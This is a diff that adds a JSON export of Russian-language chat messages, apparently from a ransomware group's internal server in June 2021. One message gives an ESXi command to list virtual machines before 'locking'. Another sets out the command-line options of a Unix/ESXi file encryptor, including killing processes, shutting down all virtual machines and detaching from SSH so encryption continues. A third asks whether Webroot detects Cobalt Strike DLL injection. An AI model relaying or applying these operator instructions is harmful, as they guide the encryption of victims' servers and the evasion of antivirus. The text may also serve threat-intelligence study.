@@ -1,0 +1,56 @@
+{
+  "messages": [
+    {
+      "_id": "zwb6k6hrXELmeqJYy",
+      "rid": "PW4BhHQvTrsCSuht2",
+      "msg": "```перед локом проверить список vm на esxi, чтоб точно не ошибиться, можно командой(оболочки esxi):\nvim-cmd vmsvc/getallvms```",
+      "ts": "2021-06-26T19:14:47.775Z",
+      "u": {
+        "_id": "PHFjy9riB2PEg2bCZ",
+        "username": "hitech"
+      },
+      "mentions": [],
+      "channels": [],
+      "_updatedAt": "2021-06-26T19:16:17.746Z",
+      "editedAt": "2021-06-26T19:16:17.741Z",
+      "editedBy": {
+        "_id": "PHFjy9riB2PEg2bCZ",
+        "username": "hitech"
+      },
+      "urls": []
+    },
+    {
+      "_id": "3Erip7HYZSGsuGvSH",
+      "rid": "PW4BhHQvTrsCSuht2",
+      "msg": "```\nПараметры запуска unix версии\n\n--path\n     При использовании этого параметра локер зашифрует файлы по указанному пути. Обязательный параметр без него лочить ни чего не будет.\n     ./encryptor --path /path\n     \n--prockiller\n     Убивает все процессы которые мешают открытию файлов.\n     ./encryptor --path /path --prockiller\n     \n--log\n     Включает логирование всех действий и ошибок\n     ./encryptor --path /path --log /root/log.txt\n     \n--vmkiller(Только для esxi)\n     Выключает все виртуальные машины\n     \n--vmlist(Только для esxi)\n     Задает файл со списком виртуальных машин, которые не надо выключать. По одной строке на каждую вм\n     ./encryptor --path /path --vmkiller --vmlist /tmp/list.txt   \n\n--detach\n      Отвязывает процесс от терминала. \nЧтобы если ssh сессия отвалилась локер дальше работал \nИ файлы не побил \n\nESXi версию ЗАПРАШИВАЙТЕ ОТДЕЛЬНО\n\n\nЕсли где то не запускается мне надо ос, версию ядра и версию glibc \n/lib64/libc.so.6\n```",
+      "ts": "2021-06-24T15:17:42.721Z",
+      "u": {
+        "_id": "7JTqsEQgD5iRCZkZz",
+        "username": "alter"
+      },
+      "mentions": [],
+      "channels": [],
+      "_updatedAt": "2021-06-24T15:19:34.747Z",
+      "editedAt": "2021-06-24T15:19:34.741Z",
+      "editedBy": {
+        "_id": "7JTqsEQgD5iRCZkZz",
+        "username": "alter"
+      },
+      "urls": []
+    },
+    {
+      "_id": "KKCA8kfJNPEq5GzJS",
+      "rid": "PW4BhHQvTrsCSuht2",
+      "msg": "webroot палит дллинжект из под кобальта\nпо шаре палит? кто то тестил за последние 2-4 недели?",
+      "ts": "2021-06-23T19:27:15.913Z",
+      "u": {
+        "_id": "9DLt48iA7ePC6pzqw",
+        "username": "rozetka"
+      },
+      "mentions": [],
+      "channels": [],
+      "_updatedAt": "2021-06-23T19:27:15.956Z"
+    }
+  ],
+  "success": true
+}
